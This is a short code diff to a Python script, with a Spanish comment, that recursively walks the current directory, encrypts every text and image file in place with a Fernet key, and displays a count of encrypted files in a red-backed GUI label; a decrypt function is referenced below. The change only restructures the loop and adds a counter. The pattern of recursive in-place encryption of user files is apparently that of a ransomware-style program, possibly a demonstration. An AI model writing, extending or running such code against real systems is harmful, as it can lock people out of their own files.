@@ -39,7 +39,7 @@ ALLOWED_EXTENSIONS = {'.txt', '.jpg', '.jpeg', '.png'}
 
 def encrypt_files():
     key = load_encryption_key()
-    files = []
+    total_files_encrypted = 0
 
     # Recorre el directorio actual y sus subdirectorios
     for root, directories, filenames in os.walk('.'):
@@ -47,12 +47,9 @@ def encrypt_files():
             filepath = os.path.join(root, filename)
             _, file_extension = os.path.splitext(filepath)
             if file_extension.lower() in ALLOWED_EXTENSIONS:
-                files.append(filepath)
-
-    for file in files:
-        with open(file, "rb") as thefile:
-            contents = thefile.read()
-        contents_encrypted = Fernet(key).encrypt(contents)
+                with open(filepath, "rb") as thefile:
+                    contents = thefile.read()
+                contents_encrypted = Fernet(key).encrypt(contents)
 
                 with open(filepath, "wb") as thefile:
                     thefile.write(contents_encrypted)
@@ -60,6 +57,7 @@ def encrypt_files():
                 total_files_encrypted += 1
 
     result_label.config(text=f"Total files encrypted: {total_files_encrypted}", fg="yellow", bg="red")
+
 
 
 #function to decrypt all files in the current directory
